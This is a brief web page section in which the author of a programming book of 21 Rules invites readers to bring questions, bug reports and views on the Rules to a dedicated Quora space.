  <h2>For Readers Only</h2><p>If you’ve read the book, you may have questions. Maybe some explanation doesn’t make sense to you. Or you might be curious how the villainous example used in Rule 4 is then used as an example in later Rules with no mention of its earlier villainy. Or you might find a bug in the code examples and wonder how to let me know and/or taunt me about my clumsiness. Or you might wonder whether the 21 Rules in the book are the full set, and if not what Rules were omitted.</p><p>If so, there’s an official place to ask these questions. I’ve created a space on Quora created for exactly that purpose:</p><p><strong>    https://therulesofprogramming.quora.com/</strong></p><p>No promises on how quickly I’ll get back to you, but it shouldn’t take too long. I look forward to hearing which Rules you think are useful and (even more interestingly) which ones you’re going to chuck overboard!</p>
